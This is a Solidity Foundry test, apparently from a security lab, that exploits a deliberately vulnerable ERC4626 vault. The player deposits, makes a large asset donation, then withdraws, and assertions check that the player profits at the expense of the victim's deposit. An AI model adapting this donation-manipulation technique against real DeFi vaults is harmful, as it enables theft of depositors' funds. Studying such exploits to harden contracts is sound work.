// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/ERC4626-v1/VulnerableVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MCK") {
        _mint(msg.sender, 1000000 * 10**decimals());
    }
}

contract VaultExploit is Test {
    VulnerableVault public vault;
    MockERC20 public token;
    address public player;
    address public victim;

    function setUp() public {
        token = new MockERC20();
        vault = new VulnerableVault(IERC20(address(token)));
        
        player = makeAddr("player");
        victim = makeAddr("victim");

        // Give some tokens to the player and victim
        token.transfer(player, 1000 * 10**token.decimals());
        token.transfer(victim, 10000 * 10**token.decimals());

        // Victim deposits into the vault
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(10000 * 10**token.decimals(), victim);
        vm.stopPrank();
    }

    function testExploit() public {
    vm.startPrank(player);

    // Initial state
    uint256 initialPlayerBalance = token.balanceOf(player);
    uint256 initialVaultBalance = token.balanceOf(address(vault));
    console.log("Initial player balance:", initialPlayerBalance);
    console.log("Initial vault balance:", initialVaultBalance);
    console.log("Initial vault total supply:", vault.totalSupply());
    console.log("Initial vault total assets:", vault.totalAssets());

    // Step 1: Approve and deposit
    token.approve(address(vault), type(uint256).max);
    uint256 depositAmount = 10e18; // Deposit 10 tokens
    uint256 sharesReceived = vault.deposit(depositAmount, player);
    console.log("Deposited:", depositAmount);
    console.log("Shares received:", sharesReceived);

    // Step 2: Donate
    uint256 largeDonation = 980e18; // Donate 980 tokens
    vault.donateAssets(largeDonation);
    console.log("Donated:", largeDonation);

    // Step 3: Calculate and withdraw
    uint256 playerShares = vault.balanceOf(player);
    uint256 assetsToWithdraw = vault.convertToAssets(playerShares);
    uint256 assetsReceived = vault.withdraw(assetsToWithdraw, player, player);
    console.log("Assets withdrawn:", assetsReceived);

    vm.stopPrank();

    // Final state
    uint256 finalPlayerBalance = token.balanceOf(player);
    uint256 finalVaultBalance = token.balanceOf(address(vault));
    console.log("Final player balance:", finalPlayerBalance);
    console.log("Final vault balance:", finalVaultBalance);
    console.log("Final vault total supply:", vault.totalSupply());
    console.log("Final vault total assets:", vault.totalAssets());

    // Assertions
    uint256 playerGain = finalPlayerBalance - initialPlayerBalance;
    uint256 vaultLoss = initialVaultBalance - finalVaultBalance;
    
    console.log("Player gain:", playerGain);
    console.log("Vault loss:", vaultLoss);

    assertGt(finalPlayerBalance, initialPlayerBalance, "Player should have more tokens than initial balance");
    assertLt(finalVaultBalance, initialVaultBalance, "Vault should have fewer tokens than initial balance");
    assertGt(playerGain, 100e18, "Player should have gained more than 100 tokens");
    assertGt(vaultLoss, 100e18, "Vault should have lost more than 100 tokens");
}}